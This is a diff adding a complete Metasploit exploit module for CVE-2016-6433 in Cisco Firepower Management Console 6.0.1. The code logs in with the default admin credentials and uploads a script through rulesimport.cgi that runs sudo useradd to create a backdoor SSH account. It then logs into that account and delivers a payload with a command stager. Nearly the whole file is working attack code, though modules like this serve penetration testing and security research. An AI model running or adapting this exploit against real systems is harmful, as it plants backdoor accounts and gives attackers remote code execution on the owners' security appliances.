@@ -1,0 +1,294 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Remote::SSH
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability found in Cisco Firepower Management Console.
+        The management system contains a configuration flaw that allows the www user to
+        execute the useradd binary, which can be abused to create backdoor accounts.
+        Authentication is required to exploit this vulnerability.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Matt',  # Original discovery & PoC
+          'sinn3r' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2016-6433' ],
+          [ 'URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking' ]
+        ],
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_X86,
+      'Targets'        =>
+        [
+          [ 'Cisco Firepower Management Console 6.0.1 (build 1213)', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Oct 10 2016',
+      'CmdStagerFlavor'=> %w{ echo },
+      'DefaultOptions' =>
+        {
+          'SSL'        => 'true',
+          'SSLVersion' => 'Auto',
+          'RPORT'      => 443
+        },
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        # admin:Admin123 is the default credential for 6.0.1
+        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),
+        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),
+        OptString.new('NEWSSHUSER', [false, 'New backdoor username (Default: Random)']),
+        OptString.new('NEWSSHPASS', [false, 'New backdoor password (Default: Random)']),
+        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),
+        OptInt.new('SSHPORT', [true, 'Cisco Firepower Management console\'s SSH port', 22])
+      ], self.class)
+  end
+
+  def check
+    # For this exploit to work, we need to check two services:
+    # * HTTP - To create the backdoor account for SSH
+    # * SSH  - To execute our payload
+
+    vprint_status('Checking Cisco Firepower Management console...')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, '/img/favicon.png?v=6.0.1-1213')
+    })
+
+    if res && res.code == 200
+      vprint_status("Console is found.")
+      vprint_status("Checking SSH service.")
+      begin
+        ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+          Net::SSH.start(rhost, 'admin',
+            port: datastore['SSHPORT'],
+            password: Rex::Text.rand_text_alpha(5),
+            auth_methods: ['password'],
+            non_interactive: true
+          )
+        end
+      rescue Timeout::Error
+        vprint_error('The SSH connection timed out.')
+        return Exploit::CheckCode::Unknown
+      rescue Net::SSH::AuthenticationFailed
+        # Hey, it talked. So that means SSH is running.
+        return Exploit::CheckCode::Appears
+      rescue Net::SSH::Exception => e
+        vprint_error(e.message)
+      end
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def get_sf_action_id(sid)
+    requirements = {}
+
+    print_status('Attempting to obtain sf_action_id from rulesimport.cgi')
+
+    uri = normalize_uri(target_uri.path, 'DetectionPolicy/rules/rulesimport.cgi')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => uri,
+      'cookie' => "CGISESSID=#{sid}"
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Failed to obtain rules import requirements.')
+    end
+
+    sf_action_id = res.body.scan(/sf_action_id = '(.+)';/).flatten[1]
+
+    unless sf_action_id
+      fail_with(Failure::Unknown, 'Unable to obtain sf_action_id from rulesimport.cgi')
+    end
+
+    sf_action_id
+  end
+
+  def create_ssh_backdoor(sid, user, pass)
+    uri          = normalize_uri(target_uri.path, 'DetectionPolicy/rules/rulesimport.cgi')
+    sf_action_id = get_sf_action_id(sid)
+    sh_name      = 'exploit.sh'
+
+    print_status("Attempting to create an SSH backdoor as #{user}:#{pass}")
+
+    mime_data = Rex::MIME::Message.new
+    mime_data.add_part('Import', nil, nil, 'form-data; name="action_submit"')
+    mime_data.add_part('file', nil, nil, 'form-data; name="source"')
+    mime_data.add_part('1', nil, nil, 'form-data; name="manual_update"')
+    mime_data.add_part(sf_action_id, nil, nil, 'form-data; name="sf_action_id"')
+    mime_data.add_part(
+      "sudo useradd -g ldapgroup -p `openssl passwd -1 #{pass}` #{user}; rm /var/sf/SRU/#{sh_name}",
+      'application/octet-stream',
+      nil,
+      "form-data; name=\"file\"; filename=\"#{sh_name}\""
+    )
+
+    send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => uri,
+      'cookie'   => "CGISESSID=#{sid}",
+      'ctype'    => "multipart/form-data; boundary=#{mime_data.bound}",
+      'data'     => mime_data.to_s,
+      'vars_get' => { 'no_mojo' => '1' },
+    })
+  end
+
+  def generate_new_username
+    datastore['NEWSSHUSER'] || Rex::Text.rand_text_alpha(5)
+  end
+
+  def generate_new_password
+    datastore['NEWSSHPASS'] || Rex::Text.rand_text_alpha(5)
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'cisco',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def do_login
+    console_user = datastore['USERNAME']
+    console_pass = datastore['PASSWORD']
+    uri          = normalize_uri(target_uri.path, 'login.cgi')
+
+    print_status("Attempting to login in as #{console_user}:#{console_pass}")
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'vars_post' => {
+        'username' => console_user,
+        'password' => console_pass,
+        'target'   => ''
+      }
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')
+    end
+
+    res_cookie = res.get_cookies
+    if res.code == 302 && res_cookie.include?('CGISESSID')
+      cgi_sid = res_cookie.scan(/CGISESSID=(\w+);/).flatten.first
+      print_status("CGI Session ID: #{cgi_sid}")
+      print_good("Authenticated as #{console_user}:#{console_pass}")
+      report_cred(username: console_user, password: console_pass)
+      return cgi_sid
+    end
+
+    nil
+  end
+
+  def execute_command(cmd, opts = {})
+    @first_exec = true
+    cmd.gsub!(/\/tmp/, '/usr/tmp')
+
+    # Weird hack for the cmd stager.
+    # Because it keeps using > to write the payload.
+    if @first_exec
+      @first_exec = false
+    else
+      cmd.gsub!(/>>/, ' > ')
+    end
+
+    begin
+      Timeout.timeout(3) do
+        @ssh_socket.exec!("#{cmd}\n")
+        vprint_status("Executing #{cmd}")
+      end
+    rescue Timeout::Error
+      fail_with(Failure::Unknown, 'SSH command timed out')
+    rescue Net::SSH::ChannelOpenFailed
+      print_status('Trying again due to Net::SSH::ChannelOpenFailed (sometimes this happens)')
+      retry
+    end
+  end
+
+  def init_ssh_session(user, pass)
+    print_status("Attempting to log into SSH as #{user}:#{pass}")
+
+    factory = ssh_socket_factory
+    opts = {
+      auth_methods: ['password', 'keyboard-interactive'],
+      port: datastore['SSHPORT'],
+      use_agent: false,
+      config: false,
+      password: pass,
+      proxy: factory,
+      non_interactive: true
+    }
+
+    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
+
+    begin
+      ssh = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        @ssh_socket = Net::SSH.start(rhost, user, opts)
+      end
+    rescue Net::SSH::Exception => e
+      fail_with(Failure::Unknown, e.message)
+    end
+  end
+
+  def exploit
+    # To exploit the useradd vuln, we need to login first.
+    sid = do_login
+    return unless sid
+
+    # After login, we can call the useradd utility to create a backdoor user
+    new_user = generate_new_username
+    new_pass = generate_new_password
+    create_ssh_backdoor(sid, new_user, new_pass)
+
+    # Log into the SSH backdoor account
+    init_ssh_session(new_user, new_pass)
+
+    begin
+      execute_cmdstager({:linemax => 500})
+    ensure
+      @ssh_socket.close
+    end
+  end
+
+end
